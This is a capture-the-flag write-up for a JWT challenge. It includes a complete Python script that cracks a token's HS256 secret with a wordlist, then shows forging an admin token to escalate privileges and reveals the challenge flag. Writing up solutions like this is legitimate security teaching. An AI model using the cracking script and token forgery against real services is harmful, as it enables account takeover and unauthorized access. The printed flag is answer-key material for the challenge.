# JWT Bruteforce Challenge Write-up

## Challenge Overview

![](<img/0.png>)

This challenge provided a Postman collection JSON file. When imported into Postman, it contained 3 endpoints:
- `/register`
- `/login` 
- `/me`

## Initial Analysis

### Step 1: Account Registration and Login

![](<img/1.png>)
![](<img/2.png>)

The first step was to register an account using the `/register` endpoint, then login via the `/login` endpoint to obtain a token.

### Step 2: JWT Token Analysis

![](<img/3.png>)

The token appeared to be a JWT token, so I used jwt.io to debug it. The decoded payload contained:
- `id`
- `username` 
- `iat` (issued at)
- `exp` (expiration)

## Exploitation Strategy

Based on the challenge description mentioning "there will be a surprise in the admin account," the solution approach was to:
1. Change the `username` field value to `'admin'`
2. Access the `/me` endpoint

However, the JWT secret used was unknown, requiring a bruteforce attack to discover it.

## JWT Secret Bruteforce

### Bruteforce Script

```python
import jwt
import sys
from tqdm import tqdm

def load_wordlist(path):
    with open(path, 'r', encoding='latin-1') as f:
        return [line.strip() for line in f.readlines()]

def jwt_bruteforce(token, wordlist_path, algorithm='HS256'):
    wordlist = load_wordlist(wordlist_path)
    header = jwt.get_unverified_header(token)
    print(f"[i] JWT Algorithm: {header.get('alg', algorithm)}")
    print(f"[i] Total passwords to try: {len(wordlist)}")

    for secret in tqdm(wordlist, desc="Bruteforcing"):
        try:
            payload = jwt.decode(token, secret, algorithms=[algorithm])
            print("\n[+] Secret key found:", secret)
            print("[+] Decoded payload:", payload)
            return secret
        except jwt.InvalidSignatureError:
            continue
        except jwt.DecodeError:
            continue
        except Exception as e:
            print("\n[!] Unexpected error:", e)
            break

    print("\n[-] Secret key not found.")
    return None

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print(f"Usage: python {sys.argv[0]} <jwt_token> <path_to_wordlist.txt>")
        sys.exit(1)

    jwt_token = sys.argv[1]
    wordlist_path = sys.argv[2]
    jwt_bruteforce(jwt_token, wordlist_path)
```

### Bruteforce Results

![](<img/4.png>)

Using the rockyou.txt wordlist, the script successfully discovered the JWT secret: **`mr.pakar`**

## Token Forgery and Flag Retrieval

### Step 1: Create New Token

![](<img/5.png>)

After finding the secret, I created a new JWT token with the `username` field changed to `'admin'`.

### Step 2: Access Admin Endpoint

![](<img/6.png>)

I accessed the `/me` endpoint using the forged token by replacing the `Authorization` field in the HTTP request header.

## Flag

```
HiB25{7eeeb84504738c837fa48e84f96557a8}
```

## Summary

This challenge demonstrated:
1. **JWT Analysis** - Understanding JWT structure and payload contents
2. **Bruteforce Techniques** - Using wordlists to crack weak JWT secrets
3. **Token Forgery** - Creating valid JWTs with modified claims
4. **Privilege Escalation** - Accessing admin functionality through token manipulation

The vulnerability stemmed from using a weak, dictionary-based secret (`mr.pakar`) for JWT signing, making it susceptible to bruteforce attacks.